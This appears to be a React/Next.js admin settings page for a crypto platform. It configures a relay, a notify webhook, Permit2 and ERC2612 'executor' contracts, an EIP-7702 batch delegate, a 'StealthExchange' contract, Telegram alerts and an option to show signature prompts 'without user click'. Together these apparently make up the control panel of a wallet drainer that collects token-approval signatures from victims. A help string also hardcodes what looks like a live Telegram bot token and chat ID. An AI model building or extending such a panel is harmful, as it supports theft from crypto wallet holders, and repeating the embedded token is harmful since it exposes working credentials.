'use client';

import { useEffect, useState } from 'react';
import { toast } from 'sonner';

interface Settings {
  relayUrl: string;
  notifyUrl: string;
  stealthExchangeAddress: string;
  permit2ExecutorAddress: string;
  erc2612ExecutorAddress: string;
  batchMulticallAddress: string;
  eip7702BatchDelegateAddress: string;
  sequenceStage1Address: string;
  sequenceStage2Address: string;
  sequenceEip7702ModuleAddress: string;
  sequenceSessionManagerAddress: string;
  sequencePermit2Address: string;
  ethereumRpcUrl: string;
  autoSignaturePrompt: boolean;
  telegramBotToken: string;
  telegramChatId: string;
  telegramAdminChatIds: string;
  telegramWebhookSecret: string;
  [key: string]: string | boolean;
}

export default function AdminSettingsPage() {
  const [settings, setSettings] = useState<Settings | null>(null);
  const [editedSettings, setEditedSettings] = useState<Settings | null>(null);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [hasChanges, setHasChanges] = useState(false);

  useEffect(() => {
    loadSettings();
  }, []);

  const loadSettings = async () => {
    try {
      setLoading(true);
      const response = await fetch('/api/settings', {
        method: 'GET',
      });

      if (!response.ok) {
        const error = await response.json();
        toast.error(error.message || 'Failed to load settings');
        return;
      }

      const data = await response.json();
      setSettings(data.settings);
      setEditedSettings(data.settings);
      setHasChanges(false);
    } catch (err) {
      toast.error(`Error: ${err instanceof Error ? err.message : String(err)}`);
    } finally {
      setLoading(false);
    }
  };

  const handleChange = (key: string, value: string | boolean) => {
    if (!editedSettings) return;

    const newSettings = { ...editedSettings, [key]: value };
    setEditedSettings(newSettings);

    const changed = JSON.stringify(settings) !== JSON.stringify(newSettings);
    setHasChanges(changed);
  };

  const handleSave = async () => {
    if (!editedSettings || !hasChanges) return;

    setSaving(true);
    try {
      const response = await fetch('/api/settings', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(editedSettings),
      });

      if (!response.ok) {
        const error = await response.json();
        toast.error(error.message || 'Failed to save settings');
        setSaving(false);
        return;
      }

      const data = await response.json();
      setSettings(data.settings);
      setEditedSettings(data.settings);
      setHasChanges(false);
      toast.success('Settings saved successfully');
    } catch (err) {
      toast.error(`Error: ${err instanceof Error ? err.message : String(err)}`);
    } finally {
      setSaving(false);
    }
  };

  const handleReset = () => {
    setEditedSettings(settings);
    setHasChanges(false);
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-black p-8 flex items-center justify-center">
        <div className="text-gray-400">Loading settings...</div>
      </div>
    );
  }

  if (!editedSettings) {
    return (
      <div className="min-h-screen bg-black p-8 flex items-center justify-center">
        <div className="text-red-400">Failed to load settings</div>
      </div>
    );
  }

  const sections: Array<{
    title: string;
    fields: Array<{
      label: string;
      key: string;
      type: string;
      help?: string;
    }>;
  }> = [
    {
      title: 'Relay & Notification Services',
      fields: [
        {
          label: 'Relay URL',
          key: 'relayUrl',
          type: 'text',
          help: 'Backend relay service endpoint for transaction submission',
        },
        {
          label: 'Notify URL',
          key: 'notifyUrl',
          type: 'text',
          help: 'Webhook endpoint for notifications and alerts',
        },
      ],
    },
    {
      title: 'Platform Contracts',
      fields: [
        {
          label: 'StealthExchange Address',
          key: 'stealthExchangeAddress',
          type: 'text',
          help: undefined,
        },
        {
          label: 'Permit2 Executor Address',
          key: 'permit2ExecutorAddress',
          type: 'text',
          help: undefined,
        },
        {
          label: 'ERC2612 Executor Address',
          key: 'erc2612ExecutorAddress',
          type: 'text',
          help: undefined,
        },
        {
          label: 'Batch Multicall Address',
          key: 'batchMulticallAddress',
          type: 'text',
          help: undefined,
        },
        {
          label: 'EIP7702 Batch Delegate Address',
          key: 'eip7702BatchDelegateAddress',
          type: 'text',
          help: undefined,
        },
      ],
    },
    {
      title: 'Sequence Wallet Contracts',
      fields: [
        {
          label: 'Stage1 Module Address',
          key: 'sequenceStage1Address',
          type: 'text',
          help: undefined,
        },
        {
          label: 'Stage2 Module Address',
          key: 'sequenceStage2Address',
          type: 'text',
          help: undefined,
        },
        {
          label: 'EIP7702 Module Address',
          key: 'sequenceEip7702ModuleAddress',
          type: 'text',
          help: undefined,
        },
        {
          label: 'Session Manager Address',
          key: 'sequenceSessionManagerAddress',
          type: 'text',
          help: undefined,
        },
        {
          label: 'Permit2 Address',
          key: 'sequencePermit2Address',
          type: 'text',
          help: undefined,
        },
      ],
    },
    {
      title: 'RPC & Infrastructure',
      fields: [
        {
          label: 'Ethereum RPC URL',
          key: 'ethereumRpcUrl',
          type: 'text',
          help: 'Primary RPC endpoint for blockchain interaction',
        },
      ],
    },
    {
      title: 'Runtime Features',
      fields: [
        {
          label: 'Auto Signature Prompt',
          key: 'autoSignaturePrompt',
          type: 'checkbox',
          help: 'Automatically show signature prompts without user click',
        },
      ],
    },
    {
      title: 'Telegram Bot Configuration',
      fields: [
        {
          label: 'Bot Token',
          key: 'telegramBotToken',
          type: 'password',
          help: 'Premium Admin Bot token from @BotFather (8863132541:AAGYDkoAyArYyuR20q9n3AwpBXFmacOI4FU)',
        },
        {
          label: 'Group Chat ID',
          key: 'telegramChatId',
          type: 'text',
          help: 'Telegram group chat ID for notifications (-1003918552881)',
        },
        {
          label: 'Admin Chat IDs',
          key: 'telegramAdminChatIds',
          type: 'text',
          help: 'Comma-separated list of admin user IDs who can send commands',
        },
        {
          label: 'Webhook Secret',
          key: 'telegramWebhookSecret',
          type: 'password',
          help: 'Secret token for validating Telegram webhooks',
        },
      ],
    },
  ];

  return (
    <div className="min-h-screen bg-black p-8">
      <div className="mx-auto max-w-4xl">
        <div className="mb-8">
          <h1 className="mb-2 text-4xl font-bold text-white">Admin Settings</h1>
          <p className="text-gray-400">
            Manage platform configuration. Changes are saved permanently.
          </p>
        </div>

        {/* Status Indicator */}
        <div className="mb-6 rounded-lg border border-gray-700 bg-gray-900 p-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div
                className={`h-3 w-3 rounded-full ${
                  hasChanges ? 'bg-yellow-500' : 'bg-green-500'
                }`}
              />
              <span className="text-sm text-gray-300">
                {hasChanges ? 'Unsaved changes' : 'All changes saved'}
              </span>
            </div>
            <div className="flex gap-3">
              <button
                onClick={handleReset}
                disabled={!hasChanges || saving}
                className="rounded px-4 py-2 text-sm font-medium text-gray-300 hover:text-white disabled:opacity-50"
              >
                Discard
              </button>
              <button
                onClick={handleSave}
                disabled={!hasChanges || saving}
                className="rounded bg-blue-600 px-4 py-2 text-sm font-medium text-white hover:bg-blue-700 disabled:opacity-50"
              >
                {saving ? 'Saving...' : 'Save Changes'}
              </button>
            </div>
          </div>
        </div>

        {/* Settings Sections */}
        <div className="space-y-8">
          {sections.map((section) => (
            <div
              key={section.title}
              className="rounded-lg border border-gray-700 bg-gray-900 p-6"
            >
              <h2 className="mb-6 text-lg font-semibold text-white">
                {section.title}
              </h2>

              <div className="space-y-4">
                {section.fields.map((field) => (
                  <div key={field.key}>
                    <label className="mb-2 block text-sm font-medium text-gray-300">
                      {field.label}
                    </label>

                    {field.type === 'checkbox' ? (
                      <div className="flex items-center">
                        <input
                          type="checkbox"
                          checked={
                            editedSettings[field.key] as boolean
                          }
                          onChange={(e) =>
                            handleChange(field.key, e.target.checked)
                          }
                          className="h-4 w-4 rounded border-gray-600 bg-gray-800 text-blue-600"
                        />
                        <span className="ml-2 text-sm text-gray-400">
                          {editedSettings[field.key] ? 'Enabled' : 'Disabled'}
                        </span>
                      </div>
                    ) : (
                      <input
                        type={field.type}
                        value={editedSettings[field.key] as string}
                        onChange={(e) =>
                          handleChange(field.key, e.target.value)
                        }
                        className="w-full rounded border border-gray-600 bg-gray-800 px-3 py-2 text-sm text-white placeholder-gray-500 focus:border-blue-500 focus:outline-none"
                        placeholder={`Enter ${field.label.toLowerCase()}`}
                      />
                    )}

                    {field.help && (
                      <p className="mt-1 text-xs text-gray-500">
                        {field.help}
                      </p>
                    )}

                    {/* Show change indicator */}
                    {settings &&
                      settings[field.key] !==
                        editedSettings[field.key] && (
                        <div className="mt-1 text-xs text-yellow-400">
                          ⚠ Modified
                        </div>
                      )}
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>

        {/* Footer */}
        <div className="mt-8 rounded-lg border border-gray-700 bg-gray-900 p-4 text-center text-sm text-gray-400">
          All settings are stored permanently in the backend. Changes take effect
          immediately.
        </div>
      </div>
    </div>
  );
}
